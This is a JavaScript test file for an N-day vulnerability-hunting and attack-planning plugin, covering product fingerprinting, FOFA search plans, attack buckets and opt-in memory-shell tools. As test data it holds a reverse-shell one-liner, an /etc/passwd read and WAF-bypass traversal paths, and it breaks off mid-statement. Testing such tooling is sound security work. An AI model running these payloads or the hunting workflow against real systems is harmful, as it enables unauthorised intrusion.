// Standalone tests: pure catalog/probe logic + the two tools against a local fixture server.
// Run from the plugin dir: node --import ../../scripts/test-stub-register.mjs test/run.mjs
import fs from 'node:fs'
import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'
import {
  VERDICT,
  candidateEntries,
  evaluateProbe,
  expansionQueries,
  getEntry,
  listEntries,
  parseTargets,
  probePlan,
  probeUrl,
  readCatalog,
  resolveSakerRoot,
  screenOutcome,
} from '../lib/catalog.js'
import { draftProbes, extractNdayCandidates } from '../lib/extract.js'
import { coverageOf, scoreDoc, triageDocs, renderWorklist } from '../lib/triage.js'
import { classifyCoverageGap, deriveProductKeywords, renderCoverageGap } from '../lib/coverage-gap.js'
import { buildAttackPlan } from '../lib/plan.js'
import { bucketGates, recordGate } from '../lib/gate.js'
import { buildMemshellCliPlan, buildMemshellMcpPlan, classifyActionImpact, executeMemshellCliPlan } from '../lib/memshell-cli.js'
import { buildAccessPlan, classifyMemoryBackend, renderAccessPlan } from '../lib/post.js'
import { buildCampaignNdayQueries, buildNdaySearchPlan, campaignIdentityVariants, parseMeasurementHints, probeMeasurementQueries } from '../lib/measurement-query.js'
import { apply, decodeProbeBody, describeTransportError, detectProxyEnv, probeBaseForAsset, probeRequestOptions, summarizeTransportErrors } from '../lib/index.js'

let failed = 0
const expect = (label, condition, detail = '') => {
  if (condition) console.log(`ok   ${label}`)
  else { failed += 1; console.log(`FAIL ${label} ${detail}`) }
}
const TEST_SCOPE = '127.0.0.1, localhost, *.test'
const withTestScope = (def) => {
  if (def.name !== 'nday_match') return def
  const execute = def.execute
  return { ...def, execute: (args = {}, exec) => execute({ ...args, scope: args.scope ?? TEST_SCOPE }, exec) }
}

// ── 1. 目标解析 ────────────────────────────────────────────────────────────────
{
  const parsed = parseTargets('a.com, http://b.com/x\nc.com:8080 a.com')
  expect('解析逗号/换行/空格，且去重保序',
    parsed.length === 3 && parsed[0].base === 'http://a.com' && parsed[1].base === 'http://b.com/x'
    && parsed[2].base === 'http://c.com:8080', JSON.stringify(parsed))
  expect('显式 scheme 原样保留', parseTargets('https://d.com').at(0).base === 'https://d.com')
  expect('空输入得到空数组', parseTargets('   ').length === 0)
}

// ── 2. 单探针判定（纯函数，逐条可证伪） ────────────────────────────────────────
{
  const p = (expect2, weight = 'weak') => ({ id: 'x', path: '/x', method: 'GET', expect: expect2, weight, note: 'n' })
  expect('statusNotIn：非排除码命中',
    evaluateProbe(p({ statusNotIn: [404] }), { status: 500 }).hit === true)
  expect('statusNotIn：排除码不命中',
    evaluateProbe(p({ statusNotIn: [404] }), { status: 404 }).hit === false)
  expect('statusIn：允许集合内命中',
    evaluateProbe(p({ statusIn: [200, 302] }), { status: 302 }).hit === true)
  expect('statusIn：集合外不命中',
    evaluateProbe(p({ statusIn: [200] }), { status: 403 }).hit === false)
  expect('bodyContainsAny：命中任一即可',
    evaluateProbe(p({ bodyContainsAny: ['TongWeb', 'Tongweb'] }), { status: 200, body: 'x Tongweb y' }).hit === true)
  expect('bodyContainsAny：都不含则不命中',
    evaluateProbe(p({ bodyContainsAny: ['TongWeb'] }), { status: 200, body: 'nginx' }).hit === false)
  expect('headerContainsAny：按 header 文本判定',
    evaluateProbe(p({ headerContainsAny: ['Server: TongWeb'] }), { status: 200, headers: { server: 'TongWeb' } }).hit === true)
  expect('复合条件须全部满足', evaluateProbe(
    p({ statusIn: [200], bodyContainsAny: ['TongWeb'] }),
    { status: 200, body: 'nginx' }).hit === false)
  expect('没有 expectation 不算命中',
    evaluateProbe(p({}), { status: 200 }).hit === false)
  expect('传输失败（状态非法）不算命中',
    evaluateProbe(p({ statusNotIn: [404] }), {}).hit === false)
  expect('探针理由可读且带状态码',
    evaluateProbe(p({ statusNotIn: [404] }), { status: 500 }).reason.includes('500'))
}

// ── 3. 屏幕结论 ────────────────────────────────────────────────────────────────
{
  const outcome = (weight, hit) => ({ probe: { id: `p-${weight}`, path: '/x' }, result: { hit, weight, reason: 'r' } })
  expect('全不命中 → no-signal', screenOutcome([outcome('weak', false)]).verdict === VERDICT.NO_SIGNAL)
  expect('只有 weak → fingerprint-weak', screenOutcome([outcome('weak', true)]).verdict === VERDICT.WEAK)
  expect('有 medium → fingerprint-medium',
    screenOutcome([outcome('weak', true), outcome('medium', true)]).verdict === VERDICT.MEDIUM)
  expect('有 strong → fingerprint-strong',
    screenOutcome([outcome('medium', true), outcome('strong', true)]).verdict === VERDICT.STRONG)
  expect('结论只到 fingerprint 级别，绝不出现 confirmed/vulnerable',
    !Object.values(VERDICT).some((v) => /confirm|vuln/i.test(v)), JSON.stringify(VERDICT))
}

// ── 4. URL 拼接 ────────────────────────────────────────────────────────────────
{
  expect('base 自带路径时不丢路径', probeUrl('http://h/app', '/ejbserver/ejb') === 'http://h/app/ejbserver/ejb')
  expect('base 末尾斜杠不产生双斜杠', probeUrl('http://h/', '/x') === 'http://h/x')
  expect('裸 host 也能拼', probeUrl('http://h', '/') === 'http://h/')
}

// ── 5. 真实语料（这条把"知识层真的在包内"钉住） ────────────────────────────────
const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '..')
process.env.SAKER_ROOT = repoRoot
{
  const fixtureRoot = fs.mkdtempSync(path.join(repoRoot, '..', '_ref', 'tmp', 'nday-profile-resolution-'))
  try {
    const profile = path.join(fixtureRoot, 'profiles', 'web')
    const profileModules = path.join(profile, 'node_modules')
    const sharedRoot = path.join(profileModules, 'dsh-saker')
const stalePeer = path.join(profileModules, '.pnpm', '@dsh-external+dsh-nday-hunter@1.3.44', 'node_modules', 'dsh-saker')
    const fakeModule = path.join(profileModules, '.pnpm', '@dsh-external+dsh-nday-hunter@1.3.44', 'node_modules', '@dsh-external', 'dsh-nday-hunter', 'lib', 'catalog.js')
    fs.mkdirSync(sharedRoot, { recursive: true })
    fs.mkdirSync(stalePeer, { recursive: true })
    fs.mkdirSync(path.dirname(fakeModule), { recursive: true })
    fs.writeFileSync(path.join(profile, 'package.json'), JSON.stringify({
      dependencies: { 'dsh-saker': 'file:dsh-saker.tgz' },
      dsh: { profile: { bundles: ['dsh-saker', '@dsh-external/dsh-nday-hunter'] } },
    }))
    fs.writeFileSync(path.join(sharedRoot, 'package.json'), JSON.stringify({ name: 'dsh-saker', version: '0.4.57' }))
    fs.writeFileSync(path.join(stalePeer, 'package.json'), JSON.stringify({ name: 'dsh-saker', version: '0.4.56' }))
    expect('resolveSakerRoot 优先当前 profile 的共享包，不被旧 pnpm peer 遮蔽',
      resolveSakerRoot({}, pathToFileURL(fakeModule).href) === fs.realpathSync(sharedRoot))
  } finally {
    fs.rmSync(fixtureRoot, { recursive: true, force: true })
  }
}
{
  expect('resolveSakerRoot 能在源码树里定位', resolveSakerRoot() === repoRoot || resolveSakerRoot() !== '')
  const catalog = readCatalog(resolveSakerRoot())
  expect('语料可读且用受支持的 schema', catalog.schema === 'saker.nday.catalog/1')
  expect('语料非空（信创覆盖下限）', catalog.entries.length >= 1)
  const tongweb = getEntry(catalog, 'tongtech-tongweb-ejb-deserialization')
  expect('东方通 TongWeb 条目存在', tongweb !== null)
  expect('条目带机器可判定探针', (tongweb?.fingerprint?.probes ?? []).length > 0)
  expect('条目状态如实（未复现 ⇒ 非 verified）',
    tongweb.status !== 'verified' || tongweb.verification?.reproduced === true)
  expect('关键词过滤命中产品名', listEntries(catalog, { keyword: 'TongWeb' }).length >= 1)
  expect('关键词过滤命中中文厂商名', listEntries(catalog, { keyword: '东方通' }).length >= 1)
  expect('关键词过滤命中编号', listEntries(catalog, { keyword: 'QVD-2025-44295' }).length >= 1)
  expect('状态过滤生效', listEntries(catalog, { status: 'normalized' }).every((e) => e.status === 'normalized'))
  expect('不存在的关键词返回空', listEntries(catalog, { keyword: 'zzz-not-a-product' }).length === 0)
  expect('entryIds 收窄候选', candidateEntries(catalog, ['nope']).length === 0
    && candidateEntries(catalog, ['tongtech-tongweb-ejb-deserialization']).length === 1)
  expect('probePlan 为每个探针生成一个 URL',
    probePlan(tongweb, 'http://t:8088').length === tongweb.fingerprint.probes.length)
}

// ── 5a. 测绘语法清洗与 FOFA Nday 查询计划 ─────────────────────────────────────
{
  const title = parseMeasurementHints(['公开测绘语法：title=="U8C"（用友 U8 Cloud 页面标题）'])
  expect('查询抽取：FOFA 双等号规范成可执行 DSL，丢弃解释性尾文',
    title.length === 1 && title[0] === 'title:"U8C"', JSON.stringify(title))
  const advanced = parseMeasurementHints(['fofa: body="/fort/login" && product="SANGFOR-OSM" && icon_hash="-320896955"'])
  expect('查询抽取：保留高级 FOFA 正文/产品/图标指纹及明确合取',
    advanced.length === 1 && advanced[0].includes('body:"/fort/login"')
    && advanced[0].includes('product:"SANGFOR-OSM"') && advanced[0].includes('icon_hash:"-320896955"'),
    JSON.stringify(advanced))
  const fofaFields = parseMeasurementHints(['fofa: banner="TongWeb" && jarm="abc123" && cert.issuer.org="TongTech" && tls.ja3s="deadbeef" && status_code=200'])
  expect('查询抽取：接受 FOFA banner/JARM/证书/TLS/状态码高级字段',
    fofaFields.length === 1 && ['banner:', 'jarm:', 'cert.issuer.org:', 'tls.ja3s:', 'status_code:'].every((field) => fofaFields[0].includes(field)),
    JSON.stringify(fofaFields))
  const catalog = readCatalog(resolveSakerRoot())
  const realFidEntry = catalog.entries.find((entry) => entry.id === 'nuclei-sangfor-login-rce')
  const realFidQueries = parseMeasurementHints(realFidEntry?.fingerprint?.signals ?? [])
  const realFidPlan = buildNdaySearchPlan(catalog, { entryIds: realFidEntry?.id, focus: 'all', limit: 100 })
  expect('真实 Nday 语料中的转义 FOFA fid 指纹会进入最终查询计划',
    realFidQueries.includes('fid:"iaytNA57019/kADk8Nev7g=="')
    && realFidPlan.selected.some((group) => group.query === 'fid:"iaytNA57019/kADk8Nev7g=="'),
    JSON.stringify({ realFidQueries, selected: realFidPlan.selected.map((group) => group.query) }))
  expect('FOFA category 字段进入 Nday 查询 DSL，错误别名不会被接受',
    parseMeasurementHints(['fofa: category="服务"']).includes('category:"服务"')
    && parseMeasurementHints(['fofa: product_category="服务"']).length === 0)
  expect('查询抽取：其他测绘平台原生语法不误发给 FOFA',
    parseMeasurementHints(['shodan-query: ecology_JSessionid']).length === 0)

  const probeQueries = probeMeasurementQueries({ fingerprint: { probes: [
    { method: 'GET', path: '/', expect: { bodyContainsAny: ['qz-unique-console-marker', 'text/html', '"version"'] } },
    { method: 'POST', path: '/api', expect: { bodyContainsAny: ['post-only-signature'] } },
    { method: 'GET', path: '/', expect: { bodyContainsAny: ['content="Probe CMS"'] } },
  ] } })
  expect('查询抽取：只把具体 GET/HEAD 响应判据转成被动产品特征并剔除通用标记',
    probeQueries.includes('body:"qz-unique-console-marker"')
    && probeQueries.includes('body:"content=\\"Probe CMS\\""')
    && !probeQueries.some((query) => /text\/html|version|post-only-signature/.test(query)),
    JSON.stringify(probeQueries))

  const plan = buildNdaySearchPlan(catalog, { focus: 'rce', limit: 100 })
  const firstPage = buildNdaySearchPlan(catalog, { focus: 'rce', limit: 1 })
  expect('查询计划：真实语料能生成有边界的 RCE 查询批次',
    plan.matchedEntries > 0 && plan.queryGroups >= plan.selected.length
    && plan.selected.length <= 100 && plan.selected.every((group) => group.entryIds.length > 0))
  expect('查询计划：不包含跨平台语法、解释性句子或原始双等号',
    plan.selected.every((group) => !/shodan|quake|hunter|公开测绘语法/i.test(group.query)
      && !/(?:^|\s)[a-z][a-z0-9_.]*\s*==(?=\s*(?:"|[A-Za-z0-9_-]))/i.test(group.query)),
    plan.selected.find((group) => /shodan|quake|hunter|公开测绘语法/i.test(group.query)
      || /(?:^|\s)[a-z][a-z0-9_.]*\s*==(?=\s*(?:"|[A-Za-z0-9_-]))/i.test(group.query))?.query)
  expect('查询计划：分页游标推进且 unknown ID 明确回报',
    (firstPage.queryGroups > 1 ? firstPage.nextOffset === 1 : firstPage.nextOffset === null)
    && buildNdaySearchPlan(catalog, { entryIds: 'missing-entry', limit: 10 }).unknownEntryIds.includes('missing-entry'))
  expect('查询计划：真实语料为每组标注明确指纹、探针签名与产品别名兜底依据',
    Object.keys(plan.queryGroupBasis).some((basis) => ['catalog-fingerprint', 'probe-signature', 'port-refinement', 'product-alias'].includes(basis))
    && plan.catalogFingerprintEntries.length > 0 && plan.fallbackEntries.length > 0)
  expect('查询计划：默认首批限制为 20 组，提供后续分页游标',
    buildNdaySearchPlan(catalog).selected.length <= 20)

  const identity = { icp: '湘ICP备20260001号', domains: ['hospital.example'], organizationName: '市立医院' }
  const identityVariants = campaignIdentityVariants(identity)
  const campaignQueries = buildCampaignNdayQueries({ selected: [{ query: 'app:"Example-Portal"', basis: 'catalog-fingerprint', entryIds: ['portal-rce'] }] }, identity)
  expect('机构查询计划包含 ICP/域名/证书/页面标题正文多个归属线索',
    identityVariants.some((item) => item.kind === 'icp')
    && identityVariants.some((item) => item.kind === 'domain')
    && identityVariants.some((item) => item.query.startsWith('cert.subject.org:'))
    && identityVariants.some((item) => item.query.startsWith('cert.subject.cn:'))
    && identityVariants.some((item) => item.query.startsWith('body:'))
    && campaignQueries.length > 4)
  expect('机构查询组合 Nday 指纹与单一归属条件，保留候选映射且有查询上限',
    campaignQueries.every((item) => item.query.includes('app:"Example-Portal"') && item.entryIds.includes('portal-rce') && !item.query.includes('||'))
    && buildCampaignNdayQueries({ selected: Array.from({ length: 30 }, (_, i) => ({ query: 'title:"p' + i + '"', basis: 'probe-signature', entryIds: ['p' + i] })) }, identity).length <= 20)

  const syntheticPlan = buildNdaySearchPlan({ updated: '2026-09-26', entries: [
    { id: 'curated-rce', status: 'normalized', vulnClass: 'RCE', aliases: ['Curated Product'], fingerprint: {
      signals: ['fofa: title="Curated Product Console"'], probes: [{ method: 'GET', path: '/', expect: { bodyContainsAny: ['curated-probe-signature'] } }],
    } },
    { id: 'probe-rce', status: 'normalized', vulnClass: 'RCE', aliases: ['Probe Product'], fingerprint: {
      ports: [8088], probes: [{ method: 'GET', path: '/', expect: { bodyContainsAny: ['probe-product-signature'] } }],
    } },
    { id: 'alias-rce', status: 'normalized', vulnClass: 'RCE', aliases: ['Alias Product'], fingerprint: { ports: [9443] } },
    { id: 'unsearchable-rce', status: 'normalized', vulnClass: 'RCE', aliases: [], fingerprint: {} },
  ] }, { limit: 100 })
  expect('查询计划：已记录 GET 响应签名时作为独立查询依据',
    syntheticPlan.selected.some((group) => group.query === 'body:"probe-product-signature"' && group.basis === 'probe-signature'))
  expect('查询计划：产品别名回退使用通用 title 字段，避免把任意别名误当 FOFA app 分类',
    syntheticPlan.selected.some((group) => group.query === 'title:"Probe Product" port:"8088"' && group.basis === 'port-refinement')
    && syntheticPlan.selected.some((group) => group.query === 'title:"Probe Product"' && group.basis === 'product-alias')
    && !syntheticPlan.selected.some((group) => /app:"(?:Alias|Probe) Product"/.test(group.query)))
  expect('查询计划：质量统计区分四类依据，并明确列出无查询条目',
    syntheticPlan.catalogFingerprintEntries.includes('curated-rce')
    && syntheticPlan.probeSignatureEntries.includes('probe-rce')
    && syntheticPlan.portRefinedEntries.includes('alias-rce')
    && syntheticPlan.withoutQuery.includes('unsearchable-rce'))
}

// ── 5b. 文档抽取：只出候选，不替人下结论 ─────────────────────────────────────
{
  const kingdee = extractNdayCandidates(
    'POST /Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc\n目标：6.2.1012.4',
  )
  expect('抽取器识别单段 kdsvc 路径（曾整条漏掉）',
    kingdee.paths.includes('/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc'),
    JSON.stringify(kingdee.paths))
  expect('抽取器识别影响版本', kingdee.versions.includes('6.2.1012.4'), JSON.stringify(kingdee.versions))
  const weak = draftProbes(kingdee)
  expect('没有错误签名时降级为 weak 探针',
    weak.probes.length === 1 && weak.probes[0].weight === 'weak'
    && weak.probes[0].expect.statusNotIn.includes(404))
  expect('weak 探针明确提醒人工复核', weak.needsHuman.some((line) => line.includes('错误签名')))

  const seeyon = extractNdayCandidates([
    'GET /seeyon/thirdpartyController.do.css/..;/ajax.do',
    'java.lang.NullPointerException',
    'CNVD-2021-01627',
    'https://example.com/advisory',
  ].join('\n'))
  const reviewed = draftProbes(seeyon)
  expect('抽取器识别多段路径与 WAF 绕过写法',
    seeyon.paths.includes('/seeyon/thirdpartyController.do.css/..;/ajax.do'), JSON.stringify(seeyon.paths))
  expect('抽取器识别错误签名与 CNVD 编号',
    seeyon.signatures.includes('java.lang.NullPointerException') && seeyon.ids.cnvd.includes('CNVD-2021-01627'))
  expect('有签名时生成 medium 探针',
    reviewed.probes.length === 1 && reviewed.probes[0].weight === 'medium'
    && reviewed.probes[0].expect.bodyContainsAny.includes('java.lang.NullPointerException'))

  const none = draftProbes(extractNdayCandidates('这是一篇没有任何接口信息的说明。'))
  expect('抽不到路径与签名时明确要求人工补全', none.probes.length === 0 && none.needsHuman.length === 2)

  // 载荷/系统侧路径不是产品端点。踩过的坑：工作单把两条**库级**漏洞
  // （Dubbo Hessian 反序列化、Jackson-databind）顶到前排，就因为文档里的
  // `/tmp/success`（ysoserial 落点）与 `/dev/tcp/…`（反弹 shell 片段）被当成了 URL 指纹。
  const payloadPaths = extractNdayCandidates([
    'ysoserial 写文件 /tmp/success',
    'bash -i >& /dev/tcp/192.168.136.129/7777 0>&1',
    'docker compose 用 docker-compose.yaml 起环境',
    '读 /etc/passwd 验证',
  ].join('\n'))
  expect('载荷/系统侧路径不进候选（/tmp、/dev/tcp、/etc、yaml 全滤掉）',
    payloadPaths.paths.length === 0, JSON.stringify(payloadPaths.paths))
  const realPaths = extractNdayCandidates([
    'GET /geoserver/wfs',
    'POST /api/monitors/import',
    '/seeyon/autoinstall.do.css/..;/ajax.do',
  ].join('\n'))
  expect('真实产品端点照常保留（含 .do 与路径穿越写法）',
    realPaths.paths.includes('/geoserver/wfs') && realPaths.paths.includes('/api/monitors/import')
    && realPaths.paths.some((p) => p.includes('autoinstall.do')), JSON.stringify(realPaths.paths))
}

// ── 5c. 复用率排序：覆盖越广、危害越高、验证越便宜，越先打 ─────────────────────
{
  const entries = [
    {
      id: 'demo-rce', product: 'Demo Server', vendor: 'Demo', aliases: ['demo'], vulnClass: '未认证 RCE',
      status: 'normalized', auth: 'none', fingerprint: { probes: [{ weight: 'strong' }] },
    },
    {
      id: 'demo-info', product: 'Demo Server', vendor: 'Demo', aliases: ['demo'], vulnClass: '信息泄露',
      status: 'normalized', auth: 'none', fingerprint: { probes: [{ weight: 'medium' }] },
    },
    {
      id: 'demo-clue', product: 'Demo Server', vendor: 'Demo', aliases: ['demo'], vulnClass: '未认证 RCE',
      status: 'legacy-unreviewed', fingerprint: { probes: [] },
    },
  ]
  const assets = [
    { id: 'a1', target: 'http://a1.demo.test', tech: ['demo'] },
    { id: 'a2', target: 'http://a2.demo.test', tech: ['demo'] },
    { id: 'a3', target: 'http://a3.demo.test', tech: ['demo'] },
  ]
  const plan = buildAttackPlan(entries, assets)
  expect('复用率排序把高危害低成本桶排第一', plan.buckets[0].entryId === 'demo-rce', JSON.stringify(plan.buckets))
  expect('复用分按资产数放大', plan.buckets[0].reuseScore === 9, JSON.stringify(plan.buckets[0]))
  expect('每个资产组固定一个代表资产', plan.buckets[0].representativeAssetId === 'a1')
  expect('无线索条目被放进 clues 而不是执行桶',
    plan.clues.some((item) => item.entryId === 'demo-clue') && !plan.buckets.some((item) => item.entryId === 'demo-clue'))

  const refuted = recordGate(plan, {}, {
    bucketId: plan.buckets[0].bucketId,
    assetId: 'a1',
    outcome: 'refuted',
    evidence: 'req-1 / resp-1',
  })
  expect('代表资产证伪后不解锁铺开',
    refuted.ok && bucketGates(plan, refuted.progress)[0].spreadAllowed === false
    && bucketGates(plan, refuted.progress)[0].nextAction === 'next-bucket')
}

// ── 6. 工具端到端（本地 fixture 服务器，不发任何真实流量） ──────────────────────
// ── 6a. 语料转换工作单（nday_triage 的纯函数） ───────────────────────────────
{
  const coveredEntries = [
    { id: 'known-by-id', ids: { cve: 'CVE-2021-1111' }, fingerprint: { paths: ['/known/path'] } },
  ]
  expect('coverageOf 按编号判已覆盖',
    coverageOf({ ids: { cve: ['CVE-2021-1111'] }, paths: [] }, coveredEntries).covered === true)
  expect('coverageOf 按路径判已覆盖',
    coverageOf({ ids: { cve: [] }, paths: ['/known/path/sub'] }, coveredEntries).covered === true)
  expect('coverageOf 对陌生文档不误判',
    coverageOf({ ids: { cve: ['CVE-2099-9999'] }, paths: ['/other'] }, coveredEntries).covered === false)

  const rich = extractNdayCandidates('致远OA ajax.do 未授权任意文件上传 CNVD-2021-01627\nGET /seeyon/ajax.do\njava.lang.NullPointerException\n影响 V8.0')
  const richScore = scoreDoc(rich, { covered: false }, { file: '致远OA/ajax.do.md' })
  expect('有编号+路径+签名+高价值类目的文档拿到高分', richScore.score >= 90, String(richScore.score))
  expect('加分项都写成人话', richScore.reasons.every((r) => r.startsWith('+') || r.startsWith('-')))
  const coveredScore = scoreDoc(rich, { covered: true, coveredWhy: ['编号已在 x'] }, { file: 'x.md' })
  expect('已覆盖的文档至少被扣掉 100 分',
    richScore.score - coveredScore.score >= 100
    && coveredScore.reasons.some((r) => r.includes('已覆盖')),
    `${richScore.score} -> ${coveredScore.score}`)

  // 三个**实际踩过**的假命中，全部钉成回归断言。
  const apache = extractNdayCandidates('Apache OFBiz 身份验证绕过导致远程代码执行 CVE-2024-38856\n/webtools/control/main/ProgramExport')
  const apacheScore = scoreDoc(apache, { covered: false }, {
    file: 'awesome-poc/开发框架漏洞/Apache OFBiz 身份验证绕过导致远程代码执行 CVE-2024-38856.md',
  })
  expect('「导致远程」里的「致远」不算命中致远互联',
    !apacheScore.reasons.some((r) => r.includes('致远')), apacheScore.reasons.join(' | '))

  const uploadDoc = extractNdayCandidates('万户OA smartUpload.jsp\n/defaultroot/upload/information\n/defaultroot/extension/smartUpload.jsp')
  const uploadScore = scoreDoc(uploadDoc, { covered: false }, { file: '万户OA/smartUpload.md' })
  expect('「information」里的「infor」不算命中中创',
    !uploadScore.reasons.some((r) => r.includes('infor')), uploadScore.reasons.join(' | '))

  const android = {
    ...extractNdayCandidates('/data/system_ce/0/snapshots\n/data/system_de'),
    links: ['https://example.invalid/weaver-ecology-advisory'],
  }
  const androidScore = scoreDoc(android, { covered: false }, { file: 'hacktricks/android-physical-attacks.md' })
  expect('参考文献里出现 weaver 不给这份 Android 文档加信创分',
    !androidScore.reasons.some((r) => r.includes('weaver')), androidScore.reasons.join(' | '))

  const docs = [
    { file: '国产OA/蓝凌OA treexml.tmpl 远程命令执行 CNVD-2021-99999.md', text: 'POST /data/sys-common/treexml.tmpl\n影响 V8.0' },
    { file: '框架/Apache Dubbo Hessian 反序列化 CVE-2020-1948.md', text: 'POST /dubbo/service/method\n影响 2.7.8' },
    { file: '已覆盖/老条目.md', text: 'CNVD-2021-01627\nGET /seeyon/ajax.do' },
    { file: '噪声/闲聊.md', text: '这是一篇没有路径也没有编号的笔记' },
  ]
  const result = triageDocs(docs, { entries: [{ id: 'seeyon-oa-ajaxdo-file-upload', ids: { cnvd: 'CNVD-2021-01627' }, fingerprint: { paths: ['/seeyon/ajax.do'] } }], limit: 10 })
  expect('工作单把信创条目排在通用框架之前',
    result.ranked[0]?.file.includes('蓝凌OA'), JSON.stringify(result.ranked.map((r) => [r.file, r.score])))
  expect('文件名里的 CNVD 也算编号（正文没重复也能抽到）',
    result.ranked[0]?.ids.cnvd.includes('CNVD-2021-99999'), JSON.stringify(result.ranked[0]?.ids))
  expect('已覆盖的文档不进工作单',
    !result.ranked.some((r) => r.file.includes('已覆盖')), JSON.stringify(result.ranked.map((r) => r.file)))
  expect('工作单统计给出扫描/已覆盖/达标三个数',
    result.stats.scanned === 4 && result.stats.alreadyCovered === 1 && result.stats.eligible >= 1,
    JSON.stringify(result.stats))
  const rendered = renderWorklist(result, { root: '/lib' })
  expect('工作单渲染写明「是候选不是结论」并给出下一步',
    rendered.includes('不是漏洞结论') && rendered.includes('nday_draft'))
}

// ── 6b. 覆盖缺口（S2 的第二个产物：从资产账本派生盲区） ──────────────────────
{
  const assets = [
    { target: 'http://a', title: '泛微协同办公OA', tech: ['Weaver E-cology'] },
    { target: 'http://b', title: 'TongWeb 管理控制台', tech: ['TongWeb'] },
    { target: 'http://c', title: 'Nacos', tech: ['Nacos'] },
    { target: 'http://d', title: 'TongWeb 集群节点', tech: ['TongWeb'] },
    { target: 'http://e', title: '登录', tech: [] },
  ]
  const keywords = deriveProductKeywords(assets)
  expect('从 tech + title 派生产品关键词，并按资产数排序',
    keywords[0].keyword === 'tongweb' && keywords[0].assets === 2, JSON.stringify(keywords))
  expect('title 里的中文厂商也能派生',
    keywords.some((k) => k.keyword === '泛微'), JSON.stringify(keywords.map((k) => k.keyword)))
  expect('纯噪音标题不派生关键词（登录/首页这类被停用词挡住）',
    !keywords.some((k) => ['登录', '首页', '系统'].includes(k.keyword)))

  const rows = [
    { keyword: 'tongweb', assets: 2, from: 'tech', scan: { l1: { siftable: 2, ids: ['a', 'b'] }, l2: { total: 0 }, l3: { total: 1 } } },
    { keyword: 'nacos', assets: 1, from: 'tech', scan: { l1: { siftable: 0, ids: [] }, l2: { total: 7 }, l3: { total: 8 } } },
    { keyword: '中创', assets: 1, from: 'title', scan: { l1: { siftable: 0, ids: [] }, l2: { total: 0 }, l3: { total: 0 } } },
  ]
  const buckets = classifyCoverageGap(rows)
  expect('三层全空 / 只有文档模板 / 已可筛 分三档',
    buckets.blind.length === 1 && buckets.blind[0].keyword === '中创'
    && buckets.docsOnly.length === 1 && buckets.docsOnly[0].keyword === 'nacos'
    && buckets.siftable.length === 1 && buckets.siftable[0].keyword === 'tongweb',
    JSON.stringify(buckets))
  const rendered = renderCoverageGap(rows, { totalAssets: 4, inventoryFile: 'asset-inventory.json' })
  expect('缺口表把「盲得最狠」排最前并给出下一步',
    rendered.indexOf('三层全空') < rendered.indexOf('nday_draft')
    && rendered.includes('不发任何流量'))
  // 关键词是子串匹配：`spring` 会命中 `tongtech-tongweb-spring-httpinvoker-rce`。
  // 命中条目必须列出来，否则看表的人会以为「Spring 已覆盖」。
  expect('可筛档列出命中的条目 id，避免子串命中被误读',
    rendered.includes('命中：a / b'), rendered)
}

const toolDefs = new Map()
const settingsState = {};
const mcpCalls = [];
let ndayBatchSearchHandler = null
const ndayCtx = {
  tools: {
    register: (def) => toolDefs.set(def.name, withTestScope(def)),
    execute: async (request) => {
      mcpCalls.push(request);
      if (request.name === 'asset_search_batch' && ndayBatchSearchHandler) {
        return { value: await ndayBatchSearchHandler(request.arguments) }
      }
      return { value: { ok: true, text: 'mcp ok' } };
    },
    view: () => [],
  },
  settings: { get: (ns) => ns === 'sec-config' ? settingsState.value : undefined },
}
apply(ndayCtx)
expect('注册了核心 Nday 工具',
  ['nday_catalog', 'nday_scope_hunt', 'nday_match', 'nday_draft', 'attack_plan', 'attack_gate', 'zday_pattern', 'nday_handoff', 'nday_triage'].every((name) => toolDefs.has(name)),
  [...toolDefs.keys()].join(','))
expect('默认工具表隐藏访问确认和内存马能力', !toolDefs.has('access_confirm') && !toolDefs.has('memshell_cli'), [...toolDefs.keys()].join(','))
apply(ndayCtx, { enablePostRceTools: true })
expect('显式 opt-in 才挂载访问确认和内存马工具', toolDefs.has('access_confirm') && toolDefs.has('memshell_cli'))

const focusedToolDefs = new Map()
const focusedNdayCtx = {
  ...ndayCtx,
  tools: { ...ndayCtx.tools, register: (def) => focusedToolDefs.set(def.name, withTestScope(def)) },
}
const pentestNdayTools = ['nday_catalog', 'nday_scope_hunt', 'attack_plan', 'nday_coverage', 'nday_match', 'nday_draft', 'nday_learn', 'zday_pattern', 'oob_probe', 'nday_handoff']
apply(focusedNdayCtx, { enablePostRceTools: false, exposedTools: pentestNdayTools })
expect('Pentest allowlist 只注册 RCE 主线 Nday 工具',
  JSON.stringify([...focusedToolDefs.keys()].sort()) === JSON.stringify([...pentestNdayTools].sort()),
  [...focusedToolDefs.keys()].join(','))
focusedToolDefs.clear()
apply(focusedNdayCtx, { exposedTools: ['nday_catalog'] })
expect('allowlist 同样能隐藏其余每个注册点',
  JSON.stringify([...focusedToolDefs.keys()]) === JSON.stringify(['nday_catalog']),
  [...focusedToolDefs.keys()].join(','))
let invalidAllowlistRejected = false
try { apply(focusedNdayCtx, { exposedTools: ['nday_catalog', 'nday_catlog'] }) } catch { invalidAllowlistRejected = true }
expect('Nday allowlist 拼错时启动失败并说明配置问题', invalidAllowlistRejected)

const catalogTool = toolDefs.get('nday_catalog')
let r = await catalogTool.execute({ keyword: 'TongWeb' })
expect('nday_catalog 列表模式返回条目', r.ok && r.text.includes('tongtech-tongweb-ejb-deserialization'), r.text)
r = await catalogTool.execute({ entryId: 'tongtech-tongweb-ejb-deserialization' })
expect('nday_catalog 详情模式给出交接工具', r.ok && r.text.includes('CurlySean/TongWebExploit'))
expect('详情模式明写"尚未由我们复现"', r.text.includes('尚未由我们复现'), r.text.slice(0, 200))
r = await catalogTool.execute({ entryId: 'does-not-exist' })
expect('未知条目如实报错', r.ok === false)

const matchTool = toolDefs.get('nday_match')
const noScope = await matchTool.execute({ targets: 'http://127.0.0.1', workspace: '.', scope: '' })
expect('nday_match 没有明确授权范围时拒绝发送探针', noScope.ok === false && noScope.error.includes('scope 不能为空'), noScope.error)

// ── 复用率的交接点：语料里记了测绘语法，就必须**交到模型手里** ────────────────
// 否则「命中一个资产」永远扩不成「一类资产」——而后者才是 P0-0 说的收益来源。
{
  const pick = (signals) => expansionQueries({ fingerprint: { signals } })
  expect('测绘语法：普通前缀被剥掉并规范为 FOFA 批量查询可用 DSL',
